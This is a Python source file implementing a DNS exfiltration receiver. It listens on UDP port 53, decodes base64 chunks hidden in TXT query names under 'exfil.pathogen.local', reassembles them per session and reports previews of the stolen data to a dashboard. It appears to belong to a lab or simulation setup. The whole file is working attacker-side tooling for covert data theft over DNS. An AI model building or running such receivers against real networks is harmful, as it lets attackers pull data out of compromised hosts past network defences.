"""DNS exfiltration receiver -- reassembles base64-encoded data from TXT queries.

Listens on UDP 53. Exfil data arrives as:
  <chunk_index>.<session_id>.<b64data>.exfil.pathogen.local

The server decodes each chunk, reassembles per session, and reports to the
dashboard in real time.
"""
from __future__ import annotations

import base64
import json
import os
import time
import threading
from collections import defaultdict
from urllib.request import Request, urlopen

from dnslib import DNSRecord, DNSHeader, RR, QTYPE, TXT
from dnslib.server import DNSServer, BaseResolver

DASHBOARD_URL = os.environ.get("DASHBOARD_URL", "http://dashboard:8000")
EXFIL_DOMAIN = "exfil.pathogen.local"

sessions: dict[str, dict] = defaultdict(lambda: {
    "chunks": {},
    "total": None,
    "started": time.time(),
})


def _report(event_type: str, data: dict) -> None:
    payload = json.dumps({
        "type": event_type,
        "data": data,
        "timestamp": time.time(),
        "source": "dns-exfil",
    }).encode()
    req = Request(
        f"{DASHBOARD_URL}/api/events",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        urlopen(req, timeout=3)
    except Exception:
        pass


class ExfilResolver(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname).rstrip(".")
        qtype = QTYPE[request.q.qtype]

        if qtype == "TXT" and qname.endswith(EXFIL_DOMAIN):
            prefix = qname[: -(len(EXFIL_DOMAIN) + 1)]
            parts = prefix.split(".", 2)

            if len(parts) == 3:
                chunk_idx_str, session_id, b64data = parts
                try:
                    chunk_idx = int(chunk_idx_str)
                except ValueError:
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("ERR")))
                    return reply

                try:
                    decoded = base64.urlsafe_b64decode(b64data + "==")
                except Exception:
                    decoded = b""

                sess = sessions[session_id]
                sess["chunks"][chunk_idx] = decoded

                _report("dns_exfil_chunk", {
                    "session": session_id,
                    "chunk": chunk_idx,
                    "size": len(decoded),
                    "query": qname,
                })

                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(f"ACK-{chunk_idx}")))

            elif len(parts) == 2 and parts[0] == "fin":
                session_id = parts[1]
                sess = sessions[session_id]
                ordered = sorted(sess["chunks"].items())
                reassembled = b"".join(v for _, v in ordered)

                preview = reassembled[:200].decode("utf-8", errors="replace")
                _report("dns_exfil_complete", {
                    "session": session_id,
                    "total_chunks": len(ordered),
                    "total_bytes": len(reassembled),
                    "preview": preview,
                })

                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(f"FIN-{len(ordered)}")))
            else:
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("ERR")))
        else:
            reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("NXDOMAIN")))

        return reply


def main():
    resolver = ExfilResolver()
    server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
    print("[dns-exfil] listening on UDP :53", flush=True)
    _report("dns_server_ready", {"port": 53})
    server.start()


if __name__ == "__main__":
    main()
